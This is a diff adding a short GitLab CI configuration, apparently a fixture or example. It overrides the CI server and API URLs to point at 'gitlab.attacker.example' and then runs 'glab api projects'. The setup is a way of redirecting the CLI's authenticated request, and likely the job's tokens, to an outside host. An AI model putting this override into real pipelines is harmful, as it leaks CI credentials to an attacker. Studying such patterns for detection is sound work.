@@ -1,0 +1,14 @@
+variables:
+  CI_SERVER_URL: "https://gitlab.attacker.example"
+  CI_API_V4_URL: "https://gitlab.attacker.example/api/v4"
+
+stages:
+  - build
+
+build:
+  stage: build
+  image: alpine:3.19
+  variables:
+    CI_PROJECT_URL: "https://gitlab.attacker.example/group/project"
+  script:
+    - glab api projects
